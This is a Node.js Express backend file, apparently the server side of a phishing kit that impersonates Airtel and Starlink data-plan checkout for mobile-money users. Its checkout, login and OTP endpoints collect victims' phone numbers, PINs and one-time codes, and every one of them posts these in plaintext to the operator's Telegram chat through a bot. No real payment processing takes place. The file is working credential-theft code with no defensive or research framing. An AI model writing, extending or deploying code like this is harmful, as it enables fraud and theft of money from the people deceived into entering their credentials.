// server.js — DRC Airtel / Starlink backend (Render)
// Env vars required on Render:
//   TELEGRAM_BOT_TOKEN
//   TELEGRAM_CHAT_ID
//   PUBLIC_URL (optional; falls back to RENDER_EXTERNAL_URL)

const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ---------- Config ----------
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

let publicUrl = process.env.PUBLIC_URL || '';
if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
  publicUrl = process.env.RENDER_EXTERNAL_URL;
}
if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
  publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
}

// ---------- Telegram helpers ----------
async function tgSend(text) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('⚠️  Telegram env vars missing — skipping send');
    return;
  }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await res.json();
    if (!data.ok) console.error('Telegram error:', data);
  } catch (err) {
    console.error('Telegram send failed:', err.message);
  }
}

async function tgSetWebhook() {
  if (!BOT_TOKEN || !publicUrl) {
    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or PUBLIC_URL missing');
    return;
  }
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
  try {
    console.log(`🔗 Registering webhook: ${webhookUrl}`);
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok) {
      console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
    } else {
      console.error('❌ Webhook registration failed:', data);
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
  }
}

// ---------- Health ----------
app.get('/', (req, res) => {
  res.json({ status: 'ok', service: 'drc-airtel-backend' });
});

// ---------- Checkout (from checkout.html) ----------
app.post('/api/checkout', async (req, res) => {
  const { plan, data, price, period, phone, pin } = req.body || {};
  console.log('📥 Checkout:', { plan, data, price, period, phone });

  const msg =
    `🛒 <b>New Checkout</b>\n\n` +
    `📦 Plan: <b>${plan || '-'}</b>\n` +
    `💾 Data: <b>${data || '-'}</b>\n` +
    `💰 Price: <b>ZMW ${price ?? '-'}</b>\n` +
    `⏱ Period: <b>${period || '-'}</b>\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔑 PIN: <b>${pin || '-'}</b>`;

  await tgSend(msg);
  res.json({ ok: true });
});

// ---------- Login (PIN page) ----------
app.post('/api/login', async (req, res) => {
  const { phone, pin } = req.body || {};
  console.log('📥 Login:', { phone });

  const msg =
    `🔐 <b>Login Attempt</b>\n\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔑 PIN: <b>${pin || '-'}</b>`;

  await tgSend(msg);
  res.json({ ok: true });
});

// ---------- OTP verify ----------
app.post('/api/verify-otp', async (req, res) => {
  const { phone, otp } = req.body || {};
  console.log('📥 OTP:', { phone });

  const msg =
    `🔢 <b>OTP Submitted</b>\n\n` +
    `📱 Phone: <b>+260 ${phone || '-'}</b>\n` +
    `🔢 OTP: <b>${otp || '-'}</b>`;

  await tgSend(msg);
  res.json({ ok: true });
});

// ---------- Telegram webhook receiver ----------
app.post('/api/telegram-webhook', (req, res) => {
  console.log('📨 Telegram update:', JSON.stringify(req.body).slice(0, 200));
  res.sendStatus(200);
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
  tgSetWebhook();
});
